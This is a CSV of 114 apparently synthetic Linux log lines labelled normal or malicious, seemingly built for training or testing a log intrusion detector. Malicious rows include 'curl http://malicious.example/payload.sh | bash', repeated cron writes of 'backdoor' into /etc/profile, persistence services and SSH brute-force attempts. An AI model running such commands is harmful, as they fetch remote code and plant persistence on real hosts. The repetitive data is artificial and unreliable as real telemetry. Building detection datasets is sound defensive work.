id,log_text,label
1,CRON[4902]: (root) CMD (uptime),normal
2,networkd: DHCPv4 address assigned to eth0,normal
3,kernel: [ 4362.32 ] Module loaded: suspicious_mod,malicious
4,CRON[1531]: (root) CMD (ls),normal
5,CRON[9847]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
6,kernel: [ 9890.22 ] Module loaded: suspicious_mod,malicious
7,sshd[7225]: Failed password for invalid user admin from 5.188.76.211 port 22 ssh2,malicious
8,bash[3411]: curl http://malicious.example/payload.sh | bash,malicious
9,bash[5911]: curl http://malicious.example/payload.sh | bash,malicious
10,CRON[9833]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
11,systemd[1]: Created malicious service persistence_9754.service,malicious
12,CRON[6507]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
13,networkd: DHCPv4 address assigned to eth0,normal
14,CRON[7174]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
15,systemd[1]: Created malicious service persistence_7864.service,malicious
16,systemd[1]: Created malicious service persistence_7391.service,malicious
17,bash[3382]: curl http://malicious.example/payload.sh | bash,malicious
18,kernel: [ 8857.21 ] USB device plugged,normal
19,CRON[1132]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
20,CRON[1139]: (root) CMD (ls),normal
21,bash[2313]: curl http://malicious.example/payload.sh | bash,malicious
22,kernel: [ 9700.8 ] Module loaded: suspicious_mod,malicious
23,sshd[7064]: Accepted publickey for user from 192.168.28.126 port 22 ssh2,normal
24,networkd: DHCPv4 address assigned to eth0,normal
25,kernel: [ 2869.87 ] USB device plugged,normal
26,CRON[2606]: (root) CMD (uptime),normal
27,systemd[1]: Created malicious service persistence_7368.service,malicious
28,sshd[5975]: Accepted publickey for user from 192.168.81.111 port 22 ssh2,normal
29,bash[7757]: curl http://malicious.example/payload.sh | bash,malicious
30,sshd[2077]: Accepted publickey for user from 192.168.73.161 port 22 ssh2,normal
31,sshd[8645]: Accepted publickey for user from 192.168.78.72 port 22 ssh2,normal
32,networkd: DHCPv4 address assigned to eth0,normal
33,sshd[3109]: Failed password for invalid user admin from 5.188.148.150 port 22 ssh2,malicious
34,systemd[1]: Created malicious service persistence_7525.service,malicious
35,systemd[1]: Created malicious service persistence_5691.service,malicious
36,CRON[6194]: (root) CMD (whoami),normal
37,networkd: DHCPv4 address assigned to eth0,normal
38,kernel: [ 9065.5 ] Module loaded: suspicious_mod,malicious
39,networkd: DHCPv4 address assigned to eth0,normal
40,CRON[5131]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
41,systemd[1]: Started Session 2753 of user root.,normal
42,CRON[2073]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
43,CRON[1599]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
44,kernel: [ 771.63 ] Module loaded: suspicious_mod,malicious
45,systemd[1]: Started Session 2467 of user root.,normal
46,systemd[1]: Started Session 2962 of user root.,normal
47,systemd[1]: Started Session 5046 of user root.,normal
48,kernel: [ 8105.37 ] Module loaded: suspicious_mod,malicious
49,systemd[1]: Created malicious service persistence_9098.service,malicious
50,sshd[9573]: Accepted publickey for user from 192.168.183.108 port 22 ssh2,normal
51,sshd[7805]: Accepted publickey for user from 192.168.118.49 port 22 ssh2,normal
52,CRON[2471]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
53,sshd[3783]: Failed password for invalid user admin from 5.188.255.78 port 22 ssh2,malicious
54,networkd: DHCPv4 address assigned to eth0,normal
55,systemd[1]: Created malicious service persistence_7194.service,malicious
56,kernel: [ 71.63 ] USB device plugged,normal
57,CRON[1948]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
58,kernel: [ 6291.85 ] USB device plugged,normal
59,sshd[6787]: Accepted publickey for user from 192.168.76.133 port 22 ssh2,normal
60,kernel: [ 8057.66 ] USB device plugged,normal
61,kernel: [ 7127.34 ] USB device plugged,normal
62,sshd[4926]: Accepted publickey for user from 192.168.9.31 port 22 ssh2,normal
63,sshd[4813]: Accepted publickey for user from 192.168.111.207 port 22 ssh2,normal
64,sshd[9478]: Accepted publickey for user from 192.168.63.241 port 22 ssh2,normal
65,networkd: DHCPv4 address assigned to eth0,normal
66,systemd[1]: Created malicious service persistence_6400.service,malicious
67,CRON[7616]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
68,sshd[8230]: Failed password for invalid user admin from 5.188.154.27 port 22 ssh2,malicious
69,networkd: DHCPv4 address assigned to eth0,normal
70,kernel: [ 7574.14 ] USB device plugged,normal
71,kernel: [ 4484.8 ] USB device plugged,normal
72,sshd[1321]: Failed password for invalid user admin from 5.188.97.223 port 22 ssh2,malicious
73,CRON[1191]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
74,networkd: DHCPv4 address assigned to eth0,normal
75,sshd[5496]: Accepted publickey for user from 192.168.210.229 port 22 ssh2,normal
76,systemd[1]: Created malicious service persistence_1364.service,malicious
77,sshd[2855]: Accepted publickey for user from 192.168.58.243 port 22 ssh2,normal
78,sshd[6760]: Failed password for invalid user admin from 5.188.19.58 port 22 ssh2,malicious
79,kernel: [ 4891.2 ] Module loaded: suspicious_mod,malicious
80,sshd[2003]: Failed password for invalid user admin from 5.188.199.121 port 22 ssh2,malicious
81,sshd[9055]: Accepted publickey for user from 192.168.194.50 port 22 ssh2,normal
82,CRON[9234]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
83,CRON[6801]: (root) CMD (pwd),normal
84,CRON[2290]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
85,networkd: DHCPv4 address assigned to eth0,normal
86,CRON[7225]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
87,networkd: DHCPv4 address assigned to eth0,normal
88,bash[3312]: curl http://malicious.example/payload.sh | bash,malicious
89,sshd[7317]: Failed password for invalid user admin from 5.188.117.33 port 22 ssh2,malicious
90,CRON[4110]: (root) CMD (pwd),normal
91,bash[9385]: curl http://malicious.example/payload.sh | bash,malicious
92,kernel: [ 9293.3 ] Module loaded: suspicious_mod,malicious
93,kernel: [ 7626.13 ] USB device plugged,normal
94,systemd[1]: Started Session 2346 of user root.,normal
95,systemd[1]: Created malicious service persistence_9318.service,malicious
96,kernel: [ 8181.46 ] Module loaded: suspicious_mod,malicious
97,kernel: [ 8877.48 ] Module loaded: suspicious_mod,malicious
98,sshd[5154]: Failed password for invalid user admin from 5.188.109.134 port 22 ssh2,malicious
99,systemd[1]: Started Session 7105 of user root.,normal
100,systemd[1]: Started Session 3447 of user root.,normal
101,kernel: [ 9059.34 ] Module loaded: suspicious_mod,malicious
102,sshd[5370]: Failed password for invalid user admin from 5.188.163.165 port 22 ssh2,malicious
103,kernel: [ 3354.87 ] USB device plugged,normal
104,kernel: [ 5792.59 ] USB device plugged,normal
105,kernel: [ 1012.65 ] Module loaded: suspicious_mod,malicious
106,CRON[6839]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
107,kernel: [ 4095.86 ] Module loaded: suspicious_mod,malicious
108,kernel: [ 9860.26 ] Module loaded: suspicious_mod,malicious
109,sshd[8463]: Failed password for invalid user admin from 5.188.46.149 port 22 ssh2,malicious
110,CRON[6111]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
111,sshd[4517]: Failed password for invalid user admin from 5.188.45.222 port 22 ssh2,malicious
112,systemd[1]: Created malicious service persistence_6339.service,malicious
113,CRON[7375]: (root) CMD (whoami),normal
114,CRON[8019]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
